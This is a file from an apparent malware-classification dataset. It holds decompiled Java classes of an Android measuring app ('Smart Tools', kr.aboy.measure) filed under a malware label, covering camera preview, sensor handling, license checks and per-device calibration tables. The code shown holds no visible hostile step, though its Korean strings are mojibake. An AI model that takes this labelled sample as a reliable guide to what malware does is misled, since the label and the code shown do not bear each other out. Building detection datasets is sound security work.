"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\g.code","class g {   final int f332a;   float[] f333b;   int c;   final SmartMeasure d;   private g(  SmartMeasure smartMeasure){     this.d=smartMeasure;     this.f332a=6;     this.f333b=new float[6];     this.c=0;   }   public g(  SmartMeasure smartMeasure,  g gVar){     this(smartMeasure);   }   public float a(  float f){     if (this.f333b[this.c] * f < -1.0f) {       for (int i=0; i < this.f333b.length; i++) {         float[] fArr=this.f333b;         fArr[i]=fArr[i] * (-1.0f);       }     }     this.c++;     if (this.c > this.f333b.length - 1) {       this.c=0;     }     this.f333b[this.c]=f;     float f2=360.0f;     float f3=-360.0f;     float f4=0.0f;     for (    float f5 : this.f333b) {       f3=Math.max(f3,f5);       f2=Math.min(f2,f5);       f4+=f5;     }     return ((f4 - f3) - f2) / (this.f333b.length - 2);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\PrefActivity.code","public class PrefActivity extends PreferenceActivity {   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     addPreferencesFromResource(C0000R.xml.settings_measure);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\Preview.code","class Preview extends SurfaceView implements Camera.PreviewCallback, SurfaceHolder.Callback {   private SurfaceHolder f320a;   private Camera f321b;   private Context c;   private PowerManager.WakeLock d;   private PowerManager e;   private FinderView f;   private Rect g;   private Point h;   private int i;   private int j;   public Preview(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.c=context;     this.f320a=getHolder();     this.f320a.addCallback(this);     this.f320a.setType(3);   }   private Camera.Size a(  int i,  int i2,  Camera.Parameters parameters){     double d=i / i2;     try {       Iterator<Camera.Size> it=parameters.getSupportedPreviewSizes().iterator();       while (it.hasNext()) {         Camera.Size next=it.next();         if (Math.abs((next.width / next.height) - d) < 0.1d && (next.width != i || next.height != i2)) {           if (next.width < (i * 3) / 2 && next.height < (i2 * 3) / 2 && (next.width > i / 2 || next.height > i2 / 2)) {             return next;           }         }       }     }  catch (    NullPointerException e) {       e.printStackTrace();     }     return null;   }   private void a(  int i,  int i2){     this.h=new Point(i,i2);   }   private Camera.Size b(  int i,  int i2,  Camera.Parameters parameters){     try {       Camera.Size size=null;       for (      Camera.Size size2 : parameters.getSupportedPreviewSizes()) {         if (size2.width <= i && size2.height <= i2) {           if (size == null) {             size=size2;           }  else {             if (((i - size2.width) + i2) - size2.height < ((i - size.width) + i2) - size.height) {               size=size2;             }           }         }       }       if (size == null) {         return null;       }       if (size.width > i / 2.2f || size.height > i2 / 2.2f) {         return size;       }       return null;     }  catch (    NullPointerException e) {       e.printStackTrace();       return null;     }   }   private void b(){     if (this.g == null) {       int i=((this.h.x < this.h.y ? this.h.x : this.h.y) * 2) / 3;       int i2=(this.h.x - i) / 2;       int i3=(this.h.y - i) / 2;       this.g=new Rect(i2,i3,i2 + i,i + i3);     }   }   void a(){     this.f.a(this.f321b);     this.f.a(this.h.x,this.h.y);   }   public void a(  FinderView finderView){     this.f=finderView;   }   @Override public void onPreviewFrame(  byte[] bArr,  Camera camera){     if (SmartMeasure.g == 1 || SmartMeasure.g == 3 || bArr == null) {       return;     }     this.f.a(bArr);   }   @Override public void surfaceChanged(  SurfaceHolder surfaceHolder,  int i,  int i2,  int i3){     try {       if (this.f321b != null) {         Camera.Parameters parameters=this.f321b.getParameters();         Camera.Size a2=a(i2,i3,parameters);         if (a2 == null) {           a2=b(i2,i3,parameters);         }         if (a2 == null || Build.MODEL.equals(""T-01C"") || Build.MODEL.equals(""IS04"")) {           this.i=i2;           this.j=i3;         }  else {           this.i=a2.width;           this.j=a2.height;         }         try {           parameters.setPreviewSize(this.i,this.j);           this.f321b.setParameters(parameters);           this.f321b.startPreview();         }  catch (        RuntimeException e) {           this.i=this.f321b.getParameters().getPreviewSize().width;           this.j=this.f321b.getParameters().getPreviewSize().height;           try {             parameters.setPreviewSize(this.i,this.j);             this.f321b.setParameters(parameters);             this.f321b.startPreview();           }  catch (          RuntimeException e2) {             this.i=160;             this.j=120;             try {               parameters.setPreviewSize(this.i,this.j);               this.f321b.setParameters(parameters);               this.f321b.startPreview();             }  catch (            RuntimeException e3) {               e3.printStackTrace();             }           }         }         a(this.i,this.j);         b();         a();         if (SmartMeasure.p) {           this.f321b.setPreviewCallback(this);         }       }     }  catch (    NullPointerException e4) {       e4.printStackTrace();     }   }   @Override public void surfaceCreated(  SurfaceHolder surfaceHolder){     if (this.f321b == null) {       try {         this.f321b=Camera.open();         this.f321b.setPreviewDisplay(this.f320a);       }  catch (      IOException e) {         this.f321b.release();         this.f321b=null;         e.printStackTrace();       } catch (      Exception e2) {         e2.printStackTrace();       }     }     this.e=(PowerManager)this.c.getSystemService(""power"");     if (this.d == null || !this.d.isHeld()) {       this.d=this.e.newWakeLock(10,""Smart Tools"");       this.d.acquire();     }   }   @Override public void surfaceDestroyed(  SurfaceHolder surfaceHolder){     if (this.f321b != null) {       if (SmartMeasure.p) {         this.f321b.setPreviewCallback(null);       }       try {         this.f321b.stopPreview();         this.f321b.release();         this.f321b=null;       }  catch (      RuntimeException e) {         e.printStackTrace();       }     }     if (this.d.isHeld()) {       this.d.release();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\SmartMeasure.code","public class SmartMeasure extends Activity {   static final int f322a=0;   static final int f323b=1;   static final int c=0;   static final int d=1;   static final int e=2;   static final float f=89.0f;   static int g=0;   static boolean h=false;   static float i=0.0f;   static float j=0.0f;   static boolean k=true;   static int l=0;   static boolean m=false;   static boolean n=true;   static int o=1;   static boolean p=false;   static boolean q=false;   static int r=0;   static int s=34;   private static final float t=83.0f;   private static final float u=97.0f;   private static final float v=89.5f;   private Sensor A;   private SharedPreferences G;   private boolean L;   private FinderView w;   private Preview x;   private SensorManager y;   private Sensor z;   private float[] B={0.0f,0.0f};   private float[] C={0.0f,0.0f};   private float[] D={0.0f,0.0f};   private float[] E={0.0f,0.0f};   private float[] F={0.0f,0.0f};   private float H=1.5f;   private float I=0.0f;   private float J=this.H + this.I;   private float K=v;   private final SensorEventListener M=new c(this);   private final int N=1;   private final int O=2;   private final int P=3;   private final int Q=4;   private final int R=5;   public static float a(  float f2){     return Math.round(f2 * 10.0f) / 10.0f;   }   private void a(){     if (Integer.valueOf(this.G.getString(""visitcount"",""0"")).intValue() == 0) {       new kr.aboy.rodjx.d().h(this).show();     }   }   public void a(  String str){     Toast.makeText(this,str,1).show();     ((Vibrator)getSystemService(""vibrator"")).vibrate(150L);   }   public float b(  float f2){     return f2 < this.K ? (f2 * 90.0f) / this.K : (((f2 - this.K) * 90.0f) / (180.0f - this.K)) + 90.0f;   }   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     setContentView(C0000R.layout.measure);     this.w=(FinderView)findViewById(C0000R.id.finder_measure);     this.x=(Preview)findViewById(C0000R.id.preview_measure);     this.x.a(this.w);     this.G=PreferenceManager.getDefaultSharedPreferences(this);     if (!getString(C0000R.string.app_tools).contains(""æ™ºèƒ½"")) {       finish();     }     a();   }   @Override public boolean onCreateOptionsMenu(  Menu menu){     boolean onCreateOptionsMenu=super.onCreateOptionsMenu(menu);     menu.add(0,5,0,C0000R.string.menu_home).setIcon(C0000R.drawable.menu_home);     menu.add(0,2,0,C0000R.string.menu_inputheight).setIcon(C0000R.drawable.menu_input);     menu.add(0,3,0,C0000R.string.menu_calibrate).setIcon(C0000R.drawable.menu_calibrate);     menu.add(0,4,0,C0000R.string.menu_settings).setIcon(C0000R.drawable.menu_settings);     menu.add(0,1,0,C0000R.string.menu_manual).setIcon(C0000R.drawable.menu_help);     return onCreateOptionsMenu;   }   @Override public boolean onOptionsItemSelected(  MenuItem menuItem){     kr.aboy.rodjx.d dVar=new kr.aboy.rodjx.d();     Log.i(""PowerManager"",""Ulight "" + Tools.c + "" : ""+ Tools.d);     if ((Tools.c > 25 || System.currentTimeMillis() > Tools.h.getTimeInMillis()) && !Tools.d) {       SharedPreferences.Editor edit=this.G.edit();       edit.putString(""measure2nd"",""2"");       edit.putString(""height1"",""100"");       edit.commit();       Toast.makeText(this,getString(C0000R.string.gone_error),1).show();       return true;     } switch (menuItem.getItemId()) { case 1:       dVar.a(this).show();     return true; case 2:   startActivity(new Intent(this,(Class<?>)DialogHeight.class)); return true; case 3: g=0; this.w.a(); new d(this).a(this).show(); return true; case 4: if (!getString(C0000R.string.app_name).contains(""Tools"")) { startActivity(new Intent(this,(Class<?>)PrefActivity.class)); return true; } Toast.makeText(this,getString(C0000R.string.gone_error),1).show(); break; case 5: finish(); return true; } return super.onOptionsItemSelected(menuItem); } @Override protected void onRestart(){ super.onRestart(); FinderView.f318a=0; FinderView.f319b=false; } @Override protected void onResume(){ super.onResume(); this.y=(SensorManager)getSystemService(""sensor""); List<Sensor> sensorList=this.y.getSensorList(1); if (sensorList.size() > 0) { this.z=sensorList.get(0); } List<Sensor> sensorList2=this.y.getSensorList(2); if (sensorList2.size() > 0) { this.A=sensorList2.get(0); } this.y.registerListener(this.M,this.z,2); this.y.registerListener(this.M,this.A,2); this.H=Float.valueOf(this.G.getString(""height1"",""1.5"")).floatValue(); this.I=Float.valueOf(this.G.getString(""height2"",""0"")).floatValue(); this.L=this.G.getBoolean(""addheight2"",false); this.J=this.L ? a(this.H + this.I) : this.H; l=Integer.valueOf(this.G.getString(""measure2nd"",""0"")).intValue(); r=Integer.valueOf(this.G.getString(""distanceunit"",""0"")).intValue(); k=this.G.getBoolean(""isexplain"",true); m=this.G.getBoolean(""ishorizon"",false); n=this.G.getBoolean(""iszoom_m"",true); o=Integer.valueOf(this.G.getString(""zoomstep"",""1"")).intValue(); p=this.G.getBoolean(""issilent"",false); q=this.G.getBoolean(""isportrait"",false); this.K=Float.valueOf(this.G.getString(""pitch90"",""89.5"")).floatValue(); j=Float.valueOf(this.G.getString(""rollzero_measure"",""0.0"")).floatValue(); s=this.G.getInt(""vcameraangle"",34); h=this.G.getBoolean(""issensor30"",false); i=Float.valueOf(this.G.getString(""devicewidth"",""0"")).floatValue(); this.w.a(this.J,this.H,this.I,this.L); g=0; this.w.a(); } @Override protected void onStop(){ super.onStop(); if (this.y == null || this.M == null) { return; } this.y.unregisterListener(this.M); this.y=null; } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\a.code","public final class a {   public static final boolean f336a=true; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\aa.code","class aa implements DialogInterface.OnKeyListener {   final LicenseCheck f344a;   public aa(  LicenseCheck licenseCheck){     this.f344a=licenseCheck;   }   @Override public boolean onKey(  DialogInterface dialogInterface,  int i,  KeyEvent keyEvent){     return i == 82 || i == 84 || i == 4;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\ab.code","public class ab implements ServiceConnection {   final LicenseCheck f345a;   public ab(  LicenseCheck licenseCheck){     this.f345a=licenseCheck;   }   @Override public void onServiceConnected(  ComponentName componentName,  IBinder iBinder){     ArmInterface armInterface;     ArmInterface armInterface2;     String str;     armInterface=this.f345a.p;     if (armInterface == null) {       this.f345a.p=ArmInterface.Stub.asInterface(iBinder);     }     try {       armInterface2=this.f345a.p;       str=this.f345a.o;       int executeArm=armInterface2.executeArm(str);       if (executeArm != 1) {         this.f345a.a(executeArm);         this.f345a.showDialog(2);       }  else {         this.f345a.e();       }       this.f345a.d();     }  catch (    Exception e) {       e.printStackTrace();       this.f345a.d();       LicenseCheck.g="" ì‚¬ìš© ê¶Œí•œì�„ í™•ì�¸í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ARMì�„  ë‹¤ì‹œ ì„¤ì¹˜í•´ ì£¼ì„¸ìš”"";       this.f345a.showDialog(2);     }   }   @Override public void onServiceDisconnected(  ComponentName componentName){     this.f345a.p=null;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\ac.code","class ac implements com.android.vending.licensing.l {   final LicenseCheck f346a;   private ac(  LicenseCheck licenseCheck){     this.f346a=licenseCheck;   }   public ac(  LicenseCheck licenseCheck,  ac acVar){     this(licenseCheck);   }   @Override public void a(){     if (this.f346a.isFinishing()) {       return;     }     LicenseCheck.a(this.f346a);   }   @Override public void a(  com.android.vending.licensing.m mVar){     if (this.f346a.isFinishing()) {       return;     }     Toast.makeText(this.f346a,""Error: "" + mVar.name(),1).show();     LicenseCheck.a(this.f346a);   }   @Override public void b(){     if (this.f346a.isFinishing()) {       return;     }     this.f346a.showDialog(0);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\ad.code","public class ad {   String f347a=Build.MODEL;   Context f348b;   float c;   float d;   int e;   int f;   float g;   boolean h;   int i;   int j;   int k;   int l;   int m;   boolean n;   public ad(  Context context){     this.d=89.5f;     this.e=1;     this.f=0;     this.g=0.0f;     this.h=true;     this.i=0;     this.j=0;     this.k=55;     this.l=34;     this.m=-1;     this.n=true;     this.f348b=context;     if (this.f347a.equals(""Gtablet"") || this.f347a.equals(""A101IT"") || this.f347a.equals(""TOSHIBA_FOLIO_AND_A"")) {       this.c=222.7f;       this.k=55;       this.l=34;     }  else     if (this.f347a.equals(""Xoom"") || this.f347a.equals(""MZ505"") || this.f347a.equals(""MZ601"")|| this.f347a.equals(""MZ602"")|| this.f347a.equals(""MZ603"")|| this.f347a.equals(""MZ604"")|| this.f347a.equals(""MZ605"")|| this.f347a.equals(""MZ606"")|| this.f347a.equals(""MZ617"")|| this.f347a.equals(""A500"")|| this.f347a.equals(""A501"")|| this.f347a.equals(""Transformer TF101"")|| this.f347a.equals(""Transformer TF101G"")|| this.f347a.equals(""Transformer Prime TF201"")|| this.f347a.equals(""ARCHOS 101G9"")|| this.f347a.equals(""F-01D"")) {       this.c=217.0f;       this.k=55;       this.l=33;       if (this.f347a.equals(""Xoom"") || this.f347a.equals(""MZ505"") || this.f347a.equals(""MZ601"")|| this.f347a.equals(""MZ602"")|| this.f347a.equals(""MZ603"")|| this.f347a.equals(""MZ604"")|| this.f347a.equals(""MZ605"")|| this.f347a.equals(""MZ606"")|| this.f347a.equals(""MZ617"")) {         this.d=93.5f;         this.e=5;         this.f=90;         this.g=0.1f;         this.i=8;         this.j=-15;         this.m=32;       }  else       if (this.f347a.equals(""Transformer TF101"") || this.f347a.equals(""Transformer TF101G"") || this.f347a.equals(""Transformer Prime TF201"")) {         this.e=5;         this.f=10;         this.g=-0.2f;       }     }  else     if (this.f347a.equals(""SHW-M380S"") || this.f347a.equals(""SHW-M380K"") || this.f347a.equals(""SHW-M380L"")|| this.f347a.equals(""SHW-M380W"")|| this.f347a.equals(""SCH-I905"")|| this.f347a.equals(""GT-P7100"")|| this.f347a.equals(""GT-P7500"")|| this.f347a.equals(""GT-P7501"")|| this.f347a.equals(""GT-P7510"")|| this.f347a.equals(""SC-01D"")) {       this.c=216.8f;       this.d=89.5f;       this.e=4;       this.f=105;       this.g=0.15f;       this.i=12;       this.j=-24;       this.k=55;       this.l=42;       this.m=13;     }  else     if (this.f347a.equals(""Sony Tablet S"")) {       this.c=202.0f;     }  else     if (this.f347a.equals(""L-06C"")) {       this.c=192.0f;       this.k=53;       this.l=40;     }  else     if (this.f347a.equals(""SHV-E140S"") || this.f347a.equals(""SHV-E140K"") || this.f347a.equals(""SHV-E140L"")|| this.f347a.equals(""SHW-M305W"")|| this.f347a.equals(""GT-P7300"")|| this.f347a.equals(""GT-P7300B"")|| this.f347a.equals(""GT-P7310"")|| this.f347a.equals(""SGH-I957"")) {       this.c=192.0f;       this.d=90.5f;       this.e=0;       this.f=125;       this.g=0.4f;       this.i=12;       this.j=-24;       this.k=53;       this.l=40;       this.m=0;     }  else     if (this.f347a.equals(""GT-P6800"") || this.f347a.equals(""GT-P6810"") || this.f347a.equals(""SHV-E150S"")) {       this.c=165.5f;       this.d=90.5f;       this.e=4;       this.f=125;       this.g=0.4f;       this.i=12;       this.j=-24;       this.k=53;       this.l=40;       this.m=13;     }  else     if (this.f347a.equals(""HTC_P515E"") || this.f347a.equals(""HTC Flyer P510e"")) {       this.c=153.8f;       this.d=89.5f;       this.e=1;       this.f=55;       this.g=0.35f;       this.i=14;       this.j=-30;       this.k=52;       this.l=38;       this.m=20;     }  else     if (this.f347a.equals(""GT-P1000"") || this.f347a.equals(""GT-P1010"") || this.f347a.equals(""GT-P1013"")|| this.f347a.equals(""GT-P1000L"")|| this.f347a.equals(""GT-P1000M"")|| this.f347a.equals(""GT-P1000N"")|| this.f347a.equals(""GT-P1000R"")|| this.f347a.equals(""GT-P1000T"")|| this.f347a.equals(""SPH-P100"")|| this.f347a.equals(""SCH-I800"")|| this.f347a.equals(""SGH-T849"")|| this.f347a.equals(""SGH-I987"")|| this.f347a.equals(""SC-01C"")|| this.f347a.equals(""SGH-N023"")|| this.f347a.equals(""SMT-i9100"")|| this.f347a.equals(""SHW-M180S"")|| this.f347a.equals(""SHW-M185S"")|| this.f347a.equals(""SHW-M180K"")|| this.f347a.equals(""SHW-M180L"")|| this.f347a.equals(""SHW-M180W"")) {       this.c=153.5f;       this.d=88.5f;       this.e=0;       this.f=110;       this.g=0.4f;       this.i=6;       this.j=-18;       this.k=55;       this.l=34;       this.m=0;     }  else     if (this.f347a.equals(""GT-P6200"") || this.f347a.equals(""GT-P6200L"") || this.f347a.equals(""GT-P6210"")|| this.f347a.equals(""GT-P6211"")|| this.f347a.equals(""SC-02D"")) {       this.c=153.5f;       this.f=110;       this.g=0.4f;       this.i=6;       this.j=-18;       this.k=55;       this.l=34;     }  else     if (this.f347a.equals(""NookColor"") || this.f347a.equals(""Kindle Fire"") || this.f347a.equals(""A101"")|| this.f347a.equals(""A01SH"")) {       this.c=153.5f;       this.k=55;       this.l=34;     }  else     if (this.f347a.equals(""HUAWEI MediaPad"")) {       this.c=151.0f;       this.k=55;       this.l=33;     }  else     if (this.f347a.equals(""A70S"") || this.f347a.equals(""A70BHT"") || this.f347a.equals(""ViewPad7"")|| this.f347a.equals(""Dell Streak 7"")|| this.f347a.equals(""AIR-910"")|| this.f347a.equals(""IDEOS S7 Slim"")|| this.f347a.equals(""enspert_e201"")) {       this.c=152.5f;       if (this.f347a.equals(""Dell Streak 7"")) {         this.d=87.0f;         this.e=6;         this.f=80;         this.g=0.35f;         this.i=10;         this.j=-21;         this.k=55;         this.l=33;         this.m=61;       }  else       if (this.f347a.equals(""enspert_e201"")) {         this.d=88.0f;         this.e=0;         this.f=45;         this.g=0.15f;         this.i=20;         this.j=-24;         this.k=54;         this.l=38;         this.m=0;       }     }  else     if (this.f347a.equals(""SHV-E160S"") || this.f347a.equals(""SHV-E160K"") || this.f347a.equals(""SHV-E160L"")|| this.f347a.equals(""GT-N7000"")|| this.f347a.equals(""GT-N7000B"")|| this.f347a.equals(""GT-I9220"")) {       this.c=114.2f;       this.d=86.0f;       this.e=6;       this.f=85;       this.g=0.15f;       this.i=11;       this.j=-24;       this.k=55;       this.l=35;       this.m=12;     }  else     if (this.f347a.equals(""IS01"") || this.f347a.equals(""SH-10B"")) {       this.c=114.0f;     }  else     if (this.f347a.equals(""IM-T100K"")) {       this.c=109.2f;       this.d=89.5f;       this.e=12;       this.f=45;       this.g=-0.2f;       this.i=12;       this.j=-27;       this.k=51;       this.l=32;       this.m=50;     }  else     if (this.f347a.equals(""YP-GB70"") || this.f347a.equals(""YP-G70"") || this.f347a.equals(""Dell Streak"")|| this.f347a.equals(""001DL"")) {       this.c=108.0f;       if (this.f347a.equals(""YP-GB70"") || this.f347a.equals(""YP-G70"")) {         this.d=88.5f;         this.e=6;         this.f=120;         this.g=0.3f;         this.i=4;         this.k=55;         this.l=34;         this.m=11;       }  else       if (this.f347a.equals(""Dell Streak"") || this.f347a.equals(""001DL"")) {         this.d=87.0f;         this.e=6;         this.f=80;         this.g=0.35f;         this.i=10;         this.j=-21;         this.k=55;         this.l=33;         this.m=61;       }     }  else     if (this.f347a.equals(""HTC_X315E"") || this.f347a.equals(""HTC Sensation XL"") || this.f347a.equals(""HTC Sensation XL with Beats Audio X315e"")) {       this.c=103.0f;       this.k=50;       this.l=31;       this.m=20;     }  else     if (this.f347a.equals(""SHV-E120S"") || this.f347a.equals(""SHV-E120K"") || this.f347a.equals(""SHV-E120L"")|| this.f347a.equals(""Galaxy Nexus"")|| this.f347a.equals(""ISW11SC"")) {       this.c=103.0f;       this.d=91.0f;       this.e=12;       this.f=90;       this.g=0.4f;       this.i=15;       this.j=-40;       this.k=55;       this.l=34;       this.m=14;     }  else     if (this.f347a.equals(""LG-F100S"") || this.f347a.equals(""LG-F100L"")) {       this.c=102.0f;     }  else     if (this.f347a.equals(""HTC Raider X710e"") || this.f347a.equals(""HTC Velocity 4G"") || this.f347a.equals(""LG-SU640"")|| this.f347a.equals(""LG-LU6200"")|| this.f347a.equals(""L-01D"")|| this.f347a.equals(""LG-P930"")|| this.f347a.equals(""SH-01D"")|| this.f347a.equals(""SBM102SH"")) {       this.c=98.5f;       this.k=60;       this.l=38;       if (this.f347a.equals(""HTC Raider X710e"") || this.f347a.equals(""HTC Velocity 4G"")) {         this.d=90.0f;         this.e=1;         this.f=65;         this.g=0.4f;         this.i=14;         this.j=-40;         this.k=60;         this.l=38;         this.m=20;       }  else       if (this.f347a.equals(""LG-SU640"") || this.f347a.equals(""LG-LU6200"") || this.f347a.equals(""L-01D"")|| this.f347a.equals(""LG-P930"")) {         this.d=92.5f;         this.e=11;         this.f=90;         this.g=0.5f;         this.i=8;         this.j=-21;         this.k=60;         this.l=38;         this.m=46;       }  else       if (this.f347a.equals(""SH-01D"") || this.f347a.equals(""SBM102SH"")) {         this.d=92.0f;       }     }  else     if (this.f347a.equals(""SGH-I997"") || this.f347a.equals(""SGH-I997R"") || this.f347a.equals(""SAMSUNG-SGH-I997"")|| this.f347a.equals(""SGH-T989"")|| this.f347a.equals(""SGH-T989D"")|| this.f347a.equals(""SGH-I727R"")|| this.f347a.equals(""SHV-E110S"")|| this.f347a.equals(""SC-03D"")) {       this.c=98.0f;       this.d=88.5f;       this.e=6;       this.f=80;       this.g=0.3f;       this.i=14;       this.j=-24;       this.k=55;       this.l=36;       this.m=12;     }  else     if (this.f347a.equals(""IM-A800S"") || this.f347a.equals(""IM-A810S"") || this.f347a.equals(""IM-A810K"")|| this.f347a.equals(""IM-A820L"")|| this.f347a.equals(""KM-S300"")) {       this.c=97.0f;       if (this.f347a.equals(""IM-A800S"")) {         this.d=88.5f;         this.e=12;         this.f=70;         this.g=0.25f;         this.i=16;         this.j=-45;         this.k=55;         this.l=36;         this.m=50;       }       if (this.f347a.equals(""IM-A810S"") || this.f347a.equals(""IM-A810K"") || this.f347a.equals(""IM-A820L"")) {         this.d=92.5f;         this.e=12;         this.f=70;         this.g=0.4f;         this.i=16;         this.j=-45;         this.k=54;         this.l=34;         this.m=50;       }  else       if (this.f347a.equals(""KM-S300"")) {         this.d=87.5f;         this.e=11;         this.f=70;         this.g=-0.1f;         this.i=13;         this.j=-27;         this.k=51;         this.l=40;         this.m=63;       }     }  else     if (this.f347a.equals(""KM-S200"") || this.f347a.equals(""DROID X2"") || this.f347a.equals(""DROID BIONIC"")|| this.f347a.equals(""MB855"")|| this.f347a.equals(""DROID RAZR"")|| this.f347a.equals(""XT910"")|| this.f347a.equals(""XT910S"")|| this.f347a.equals(""XT910K"")|| this.f347a.equals(""HTC Sensation Z710e"")|| this.f347a.equals(""HTC Sensation 4G"")|| this.f347a.equals(""HTC Pyramid"")|| this.f347a.equals(""HTC Sensation XE with Beats Audio"")|| this.f347a.equals(""HTC Sensation XE with Beats Audio Z715e"")|| this.f347a.equals(""HTC_X515E"")|| this.f347a.equals(""PG86100"")|| this.f347a.equals(""HTC EVO 3D X515m"")|| this.f347a.equals(""HTC_Amaze_4G"")|| this.f347a.equals(""HTC One S"")|| this.f347a.equals(""ADR6425"")|| this.f347a.equals(""ADR6425LVW"")|| this.f347a.equals(""SO-03D"")|| this.f347a.equals(""T-01D"")|| this.f347a.equals(""ISW11F"")|| this.f347a.equals(""F-05D"")|| this.f347a.equals(""P-04D"")|| this.f347a.equals(""N-04D"")|| this.f347a.equals(""N-05D"")) {       this.c=95.0f;       if (this.f347a.equals(""KM-S200"")) {         this.d=92.0f;         this.e=11;         this.f=120;         this.g=-0.2f;         this.i=15;         this.j=-35;         this.k=50;         this.l=39;         this.m=63;       }  else       if (this.f347a.equals(""DROID X2"") || this.f347a.equals(""DROID BIONIC"") || this.f347a.equals(""MB855"")|| this.f347a.equals(""DROID RAZR"")|| this.f347a.equals(""XT910"")|| this.f347a.equals(""XT910S"")|| this.f347a.equals(""XT910K"")) {         this.d=93.0f;         this.e=3;         this.f=55;         this.g=0.3f;         this.i=0;         this.j=-24;         this.k=46;         this.l=26;         this.m=33;       }  else       if (this.f347a.equals(""HTC Sensation Z710e"") || this.f347a.equals(""HTC Sensation 4G"") || this.f347a.equals(""HTC Pyramid"")|| this.f347a.equals(""HTC Sensation XE with Beats Audio"")|| this.f347a.equals(""HTC Sensation XE with Beats Audio Z715e"")) {         this.d=89.0f;         this.e=1;         this.f=70;         this.g=0.25f;         this.i=11;         this.j=-21;         this.k=54;         this.l=33;         this.m=30;       }  else       if (this.f347a.equals(""SO-03D"") || this.f347a.equals(""T-01D"") || this.f347a.equals(""ISW11F"")|| this.f347a.equals(""F-05D"")|| this.f347a.equals(""P-04D"")|| this.f347a.equals(""N-04D"")|| this.f347a.equals(""N-05D"")) {         this.k=56;         this.l=35;       }  else {         this.d=89.0f;         this.e=1;         this.f=70;         this.g=0.8f;         this.i=15;         this.j=-40;         this.k=61;         this.l=38;         this.m=20;       }     }  else     if (this.f347a.equals(""DROIDX"") || this.f347a.equals(""MotoroiX"") || this.f347a.equals(""Milestone X"")|| this.f347a.equals(""P-07C"")|| this.f347a.equals(""A43"")) {       this.c=94.2f;       this.k=56;       this.l=33;       if (this.f347a.equals(""DROIDX"") || this.f347a.equals(""MotoroiX"") || this.f347a.equals(""Milestone X"")) {         this.f=45;         this.g=0.2f;         this.i=-2;         this.j=0;         this.m=30;       }     }  else     if (this.f347a.equals(""PC36100"") || this.f347a.equals(""Desire HD"") || this.f347a.equals(""HTC Desire HD"")|| this.f347a.equals(""HTC Desire HD A9191"")|| this.f347a.equals(""001HT"")|| this.f347a.equals(""HTC HD2"")|| this.f347a.equals(""Desire HD2"")|| this.f347a.equals(""HD2"")|| this.f347a.equals(""ADR6400"")|| this.f347a.equals(""ADR6400L"")|| this.f347a.equals(""HTC Inspire"")|| this.f347a.equals(""Inspire 4G"")) {       this.c=93.8f;       this.d=94.0f;       this.e=1;       this.f=115;       this.g=0.2f;       this.i=12;       this.j=-18;       this.k=50;       this.l=31;       this.m=20;     }  else     if (this.f347a.equals(""LG-LU6800"") || this.f347a.equals(""LG-SU760"") || this.f347a.equals(""LG-P920"")|| this.f347a.equals(""LG-SU540"")|| this.f347a.equals(""LG-KU5400"")|| this.f347a.equals(""LG-SU870"")|| this.f347a.equals(""LG-MS910"")|| this.f347a.equals(""LG-F120S"")|| this.f347a.equals(""LG-F120K"")|| this.f347a.equals(""LG-F120L"")) {       this.c=93.3f;       if (this.f347a.equals(""LG-SU540"") || this.f347a.equals(""LG-KU5400"")) {         this.d=87.0f;         this.e=8;         this.f=110;         this.g=0.2f;         this.i=8;         this.j=-18;         this.k=53;         this.l=33;         this.m=46;       }  else {         this.d=92.0f;         this.e=12;         this.f=115;         this.g=0.2f;         this.i=9;         this.j=-9;         this.k=53;         this.l=36;         this.m=45;       }     }  else     if (this.f347a.equals(""SHW-M250S"") || this.f347a.equals(""SHW-M250K"") || this.f347a.equals(""SHW-M250L"")|| this.f347a.equals(""GT-I9100"")|| this.f347a.equals(""GT-I9100M"")|| this.f347a.equals(""GT-I9100T"")|| this.f347a.equals(""GT-I9100G"")|| this.f347a.equals(""GT-I9100P"")|| this.f347a.equals(""GT-I9103"")|| this.f347a.equals(""SPH-D710"")|| this.f347a.equals(""SC-02C"")|| this.f347a.equals(""SAMSUNG-SGH-I927"")|| this.f347a.equals(""SAMSUNG-SGH-I777"")|| this.f347a.equals(""SAMSUNG-SGH-I727"")|| this.f347a.equals(""SCH-I510"")) {       this.c=93.2f;       this.d=89.5f;       this.e=6;       this.f=60;       this.g=0.25f;       this.i=12;       this.j=-24;       this.k=55;       this.l=34;       this.m=12;       if (this.f347a.equals(""SHW-M250S"")) {         this.d=87.0f;       }     }  else     if (this.f347a.equals(""LT15i"") || this.f347a.equals(""LT15a"") || this.f347a.equals(""LT18i"")|| this.f347a.equals(""SO-01C"")|| this.f347a.equals(""SO-02C"")|| this.f347a.equals(""IS11S"")|| this.f347a.equals(""IS12SH"")|| this.f347a.equals(""IS13SH"")|| this.f347a.equals(""SBM006SH"")|| this.f347a.equals(""SH-12C"")) {       this.c=93.3f;       this.d=91.5f;       this.e=0;       this.f=90;       this.g=0.7f;       this.i=9;       this.j=-30;       this.k=56;       this.l=35;       this.m=0;       if (this.f347a.equals(""IS12SH"") || this.f347a.equals(""IS13SH"") || this.f347a.equals(""SBM006SH"")|| this.f347a.equals(""SH-12C"")) {       